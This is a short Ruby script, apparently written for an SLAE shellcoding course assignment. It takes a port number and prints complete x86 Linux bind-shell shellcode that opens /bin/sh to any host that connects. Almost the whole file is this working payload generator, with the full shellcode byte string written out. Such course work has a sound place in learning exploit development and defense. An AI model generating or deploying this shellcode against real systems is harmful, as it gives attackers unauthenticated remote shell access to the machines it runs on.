#!/usr/bin/ruby

# Filename: config_bind_tcp_port.rb
# Author: Matthew Spencer
# Description: SLAE Assignment 1. This script takes a port number as an arguement and will create shellcode that will bind a shell to any inbound ip4 address.

NAME = "config_bind_tcp_port"
USAGE = "Usage: ./" + NAME + " [1-65535] \n"

def htons(h)
        [h].pack("S").unpack("n")[0]
end

if ARGV.length == 1 && ARGV[0].to_i > 0 && ARGV[0].to_i < 65535
	hostPort = ARGV[0].to_i
	netPort =   htons(hostPort).to_s(16).rjust(4, "0")
	
	shellCode = "\"\\x31\\xc0\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xb3\\x01\\xcd\\x80\\x5f\\x97\\x31\\xc0\\x50\\x66\\x68\\x" + netPort[2,2] + "\\x" + netPort[0,2] + "\\x66\\x6a\\x02\\x89\\xe1\\x31\\xc0\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x02\\xcd\\x80\\x31\\xc0\\x50\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x04\\xcd\\x80\\x31\\xc0\\x50\\x50\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x05\\xcd\\x80\\x93\\x31\\xc0\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\"";
	puts shellCode
else
	puts USAGE
end
